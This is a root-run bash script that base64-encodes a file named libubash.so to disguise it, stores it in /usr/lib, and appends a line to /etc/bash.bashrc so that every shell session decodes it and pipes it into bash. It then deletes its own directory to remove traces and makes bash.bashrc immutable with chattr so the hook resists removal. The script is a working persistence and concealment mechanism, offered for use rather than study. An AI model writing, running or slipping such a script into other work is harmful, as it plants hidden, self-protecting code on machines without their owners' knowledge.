#!/bin/bash

set -e  # Exit on error
set -o pipefail  # Catch pipe failures

LIB_PATH="/usr/lib/libubash.so"
ENCODED_PATH="/usr/lib/libubash.enc"
BASHRC_PATH="/etc/bash.bashrc"

# Ensure the script is run as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root!" >&2
    exit 1
fi

# Ensure libubash.so is present
if [[ ! -f "libubash.so" ]]; then
    echo "Error: libubash.so not found in the current directory!" >&2
    exit 1
fi

# Encode libubash.so to obfuscate it
echo "Encoding libubash.so..."
base64 libubash.so > libubash.enc

# Move the encoded file to /usr/lib/
echo "Moving obfuscated script to $ENCODED_PATH..."
mv libubash.enc "$ENCODED_PATH"
chmod 600 "$ENCODED_PATH"  # Restrict access for security

# Remove any existing libubash.so file
rm -f "$LIB_PATH"

# Ensure /etc/bash.bashrc sources the decoded script
if ! grep -q "base64 -d $ENCODED_PATH | bash" "$BASHRC_PATH"; then
    echo "Appending execution of obfuscated script to /etc/bash.bashrc..."
    echo "[ -f \"$ENCODED_PATH\" ] && base64 -d \"$ENCODED_PATH\" | bash" >> "$BASHRC_PATH"
fi

# Self-delete the script and its directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd /
echo "Deleting script and its directory: $SCRIPT_DIR"
rm -rf "$SCRIPT_DIR"

echo "Deployment complete!"
echo "Chattring files now!"

sudo chmod -w /etc/bash.bashrd
sudo chattr +i /etc/bash.bashrc

echo "bash.bashrc now is write blocked and imutable just to be safe :)"
